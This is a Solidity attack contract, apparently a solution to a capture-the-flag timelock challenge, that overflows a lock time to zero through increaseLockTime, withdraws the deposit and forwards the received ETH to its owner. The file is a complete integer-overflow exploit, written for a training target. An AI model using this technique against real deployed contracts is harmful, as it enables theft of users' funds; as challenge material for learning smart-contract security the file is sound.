//SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "../N3-TimeLock-easy.sol";

/**
 * @notice No need to use this contract for passing the level.
 *                Anyways, here it is.
 */
contract N3TimeLockHack {
    N3TimeLock challenge;
    address private _owner;

    constructor(address N3addr) public payable {
        challenge = N3TimeLock(N3addr);
        _owner = msg.sender;

        // Do math for seconds to add
        uint256 timeLock = challenge.lockTime(_owner);
        uint256 timeToAdd = type(uint256).max - timeLock + 1;

        // Overflow lockTime to 0
        challenge.increaseLockTime(timeToAdd);
        challenge.withdraw();
    }

    receive() external payable {
        // Transfer automatically to attacker when receiving ETH
        _owner.call{value: address(this).balance}("");
    }
}
